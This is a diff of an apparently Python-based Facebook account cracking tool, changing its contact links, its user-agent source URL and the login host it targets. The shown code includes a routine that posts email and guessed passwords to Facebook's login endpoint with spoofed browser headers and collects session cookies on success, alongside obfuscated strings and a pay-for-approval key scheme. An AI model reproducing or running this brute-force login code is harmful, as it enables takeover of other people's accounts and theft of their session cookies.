@@ -6,7 +6,7 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system('xdg-open https://www.facebook.com/groups/893149411835087/?ref=share/')
+os.system('xdg-open https://www.facebook.com/nayem0242')
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
@@ -96,7 +96,7 @@ def uaku():
 		for ub in ua : 
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+		a=requests.get('https://github.com/Niki404-Cyber/user-agnet/blob/main/user-agents.txt').text
 		ua=open('.bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -548,7 +548,7 @@ def menu():
 	elif xd in ['8','08']:
 		os.system('rm -rf fb_cookies.txt')
 	elif xd in ['9','09']:
-		os.system(f'xdg-open https://wa.me/ ');menu()
+		os.system(f'xdg-open https://www.facebook.com/nayem0242/ ');menu()
 			
 	elif xd in ['0','00']:
 		exit(' KHUDA HAFIZ ')
@@ -852,7 +852,7 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
+			header_freefb = {'authority':'t.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
@@ -866,7 +866,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://t.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -954,7 +954,7 @@ def menu_apikey():
   print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print("")
   print("  SEND KEY ON ADMIN WHATSAPP,,,,,,,,,,,,,,,  ");time.sleep(1)
-  os.system('xdg-open https://wa.me/+923231243823')
+  os.system('xdg-open https://www.facebook.com/nayem0242')
   print("");time.sleep(2)
   print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
@@ -968,7 +968,7 @@ def menu_apikey():
       
       print("\x1b[1;97m    Sorry Bro Token Key not AprovedðŸ˜“")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/ ')
+      os.system('xdg-open https://www.facebook.com/nayem0242/ ')
       time.sleep(2)
       sys.exit()
   except:
@@ -1003,7 +1003,7 @@ def tnx():
       
       print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/ ')
+      os.system('xdg-open https://www.facebook.com/nayem0242/ ')
       time.sleep(2)
       sys.exit()
   except:
